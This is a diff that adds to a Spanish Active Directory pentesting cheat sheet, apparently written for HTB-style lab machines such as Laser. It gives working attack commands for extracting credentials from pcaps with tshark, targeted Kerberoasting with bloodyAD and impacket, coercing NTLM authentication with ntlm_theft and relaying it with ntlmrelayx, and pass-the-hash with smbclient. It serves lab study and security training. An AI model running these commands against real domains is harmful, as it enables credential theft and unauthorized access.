@@ -49,6 +49,8 @@ nxc smb <IP>
 # Sin esto, Kerberos y bloodhound-python fallan con errores de DNS confusos.
 echo "<IP> <HOSTNAME>.<DOMINIO> <DOMINIO> <HOSTNAME>" | sudo tee -a /etc/hosts
 # Ejemplo real: echo "10.129.74.144 SAUNA.EGOTISTICAL-BANK.LOCAL egotistical-bank.local SAUNA" | sudo tee -a /etc/hosts
+# 🔴 El FQDN NO siempre termina en .local: puede ser .com (máquina Laser = NetBIOS "LASER" / FQDN "LASER.COM").
+#    El sufijo real sale de nmap/nxc/ldap — nunca asumas ".local" ni lo inventes.
 ```
 
 > 🔴 **Error real visto en 2 de 3 máquinas:** si conectaste una VPN de un lab DISTINTO antes (ej: hiciste un módulo de Port Scanning y luego pasas a AD), tu `/etc/hosts` puede tener entradas VIEJAS de otro rango de IP que confunden todo. Revisa con `cat /etc/hosts` si hay entradas conflictivas antes de asumir que el problema es de la máquina actual.
@@ -226,7 +228,18 @@ keepassxc-cli show /ruta/al/archivo.kdbx "<ENTRADA>" -s   # -s muestra el passwo
 > nxc smb <IP> -u users.txt -p passwords_extraidos.txt
 > ```
 
-Cada credencial nueva que encuentres por cualquiera de estas 4 vías: **pruébala de inmediato contra shares nuevos** — suele destapar el siguiente share con más acceso (patrón real: cred #1 → share con solo lectura nuevo → script/kdbx con cred #2 → shell).
+**5. Una captura de red (`.pcap`/`.pcapng`) en un share o entregada por el enunciado** — el tráfico suele llevar credenciales en claro (logins HTTP, FTP, LDAP simple) o hashes NTLM:
+```bash
+# Volcado rápido de todo lo legible, filtrando por palabras clave
+tshark -r captura.pcap -V | grep -iE "pass|pwd|form item|user|NTLM|Authorization"
+# Solo POSTs de formularios HTTP (donde viajan los logins)
+tshark -r captura.pcap -Y 'http.request.method==POST' -T fields -e http.file_data
+# Credenciales de FTP en claro
+tshark -r captura.pcap -Y 'ftp.request.command=="USER" || ftp.request.command=="PASS"' -T fields -e ftp.request.arg
+```
+> Si prefieres GUI: ábrelo en Wireshark y usa *File → Export Objects → HTTP*, o *Follow TCP Stream* sobre un paquete sospechoso. Un NTLM capturado en el pcap se puede reconstruir a formato hashcat (`-m 5500`/`-m 5600`) y crackear.
+
+Cada credencial nueva que encuentres por cualquiera de estas vías: **pruébala de inmediato contra shares nuevos** — suele destapar el siguiente share con más acceso (patrón real: cred #1 → share con solo lectura nuevo → script/kdbx con cred #2 → shell).
 
 > 🔴 **Regla de comillas en bash (te va a pasar con CUALQUIER password que tenga `!`, `$`, `` ` ``, o espacios):** usa SIEMPRE comillas simples `'...'` para passwords, nunca dobles `"..."`. Las dobles permiten expansión de variables (`$algo`) e historial de comandos (`!algo`), lo que rompe el comando o deja la terminal colgada esperando más input (`dquote>` o `>` suelto). Si tu terminal se queda en `dquote>`, escribe una comilla sola y Enter para cerrarla, o `Ctrl+C`.
 
@@ -385,6 +398,24 @@ hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 ```
 
+### Targeted Kerberoasting (máquina Laser) — tienes `GenericWrite` sobre un usuario SIN SPN
+
+Si BloodHound te da `GenericWrite`/`GenericAll` sobre una cuenta que **no** tiene SPN, puedes ponerle uno tú, pedir su TGS (roast) y quitárselo después. No necesitas su password, solo el permiso de escritura.
+
+```bash
+# 1. Ponle un SPN cualquiera a la víctima (bloodyAD desde Linux, una línea)
+bloodyAD -u <USER> -p <PASS> -d <DOMINIO> --host <DC> set object <VICTIMA> servicePrincipalName -v 'fake/svc'
+
+# 2. Roastéala — pide SOLO su hash con -request-user
+impacket-GetUserSPNs <DOMINIO>/<USER>:<PASS> -dc-ip <DC> -request-user <VICTIMA> -outputfile kerb.txt
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+
+# 3. Limpia: quítale el SPN que le pusiste (higiene; a veces necesario para no romper nada)
+bloodyAD -u <USER> -p <PASS> -d <DOMINIO> --host <DC> remove object <VICTIMA> servicePrincipalName -v 'fake/svc'
+```
+
+> 🔴 El hash sale en modo **13100** (TGS), igual que un Kerberoast normal — la única diferencia es que el SPN lo pusiste tú. Alternativa nativa desde Windows: `Set-DomainObject -Identity <victima> -Set @{serviceprincipalname='fake/svc'}` (PowerView) + `Rubeus.exe kerberoast /user:<victima> /nowrap`.
+
 ---
 
 ## FASE 5b — Credenciales en archivos comprimidos/certificados (ZIP, PFX)
@@ -514,6 +545,34 @@ smbclient //<IP>/<share> -U '<user>' -c "put malicious.zip"
 ```bash
 hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 ```
+
+### 🔴 Variante RELAY (máquina Laser): `.lnk` + `ntlm_theft` + `ntlmrelayx`
+
+Mismo disparador (share con **escritura** donde un proceso/usuario del dominio navega), pero en vez de **capturar y crackear** el hash, lo **relayeas** en vivo a otro servicio donde esa cuenta sea admin — no crackeas nada. Útil cuando el hash capturado no cae con rockyou pero la cuenta tiene privilegios.
+
+```bash
+# 1. Genera TODOS los tipos de archivo que fuerzan autenticación de un solo golpe
+#    (.lnk, .url, .scf, .library-ms, etc.) apuntando a TU IP de VPN.
+git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
+python3 ntlm_theft.py -g all -s <TU_IP_VPN> -f documento   # genera la carpeta "documento/"
+```
+
+```bash
+# 2a. Si SOLO quieres el hash para crackear → Responder (como en Fluffy, arriba).
+# 2b. Si quieres RELAYear (ejecutar como la víctima, sin crackear) → ntlmrelayx.
+#     OJO: Responder y ntlmrelayx pelean por los puertos 445/80. Apaga SMB y HTTP
+#     de Responder en /usr/share/responder/Responder.conf (SMB = Off, HTTP = Off),
+#     o directamente NO arranques Responder y deja que ntlmrelayx escuche solo.
+impacket-ntlmrelayx -t smb://<IP_OBJETIVO> -smb2support -i      # -i = shell SMB interactiva al relayear
+impacket-ntlmrelayx -t smb://<IP_OBJETIVO> -smb2support         # (sin -i) vuelca SAM del objetivo
+```
+
+```bash
+# 3. Sube el/los archivo(s) malicioso(s) al share con escritura y espera el trigger
+smbclient //<IP>/<share> -U '<user>' -c "lcd documento; mput *"
+```
+
+> 🔴 **Captura vs Relay = dos salidas del MISMO disparo.** *Capturar* (Responder) te da un NetNTLMv2 que has de crackear; *relayear* (ntlmrelayx) usa la autenticación en vivo contra otro host sin crackear nada, pero falla si el objetivo exige **SMB signing** y requiere apagar SMB+HTTP de Responder para no chocar de puerto. Si la cuenta coaccionada no es admin en ningún lado, el relay no sirve: vuelve a capturar+crackear.
 
 ---
 
@@ -723,6 +782,13 @@ evil-winrm -i <IP> -u <user> -H <NT_HASH>          # Pass-the-Hash
 impacket-psexec  <dominio>/<user>:<pass>@<IP>      # crea un servicio (más ruidoso)
 impacket-wmiexec <dominio>/<user>:<pass>@<IP>      # vía WMI (más discreto)
 ```
+
+> 🔴 **Pass-the-Hash con `smbclient`** (máquina Laser) — para montar/leer un share cuando solo tienes el hash NT (no la pass), `smbclient` lo acepta directo con `--pw-nt-hash`, sin wrappers tipo `pth-smbclient`:
+> ```bash
+> smbclient //<IP>/<share> -U '<DOMINIO>/<user>' --pw-nt-hash '<NT_HASH>'   # el NT va SOLO, sin la parte LM:
+> smbclient -L //<IP>/ -U '<user>' --pw-nt-hash '<NT_HASH>'                 # listar shares con el hash
+> ```
+> El valor es solo la mitad NT (32 hex), no el `aad3b...:NT` completo. Para ejecutar (no solo leer ficheros) sigue usando psexec/wmiexec con `-hashes`.
 
 > 🔴 **Señal de alerta #1 — `Errno::ECONNREFUSED` en 5985:** el puerto está cerrado. Cambia inmediatamente a psexec/wmiexec, no reintentes evil-winrm.
 
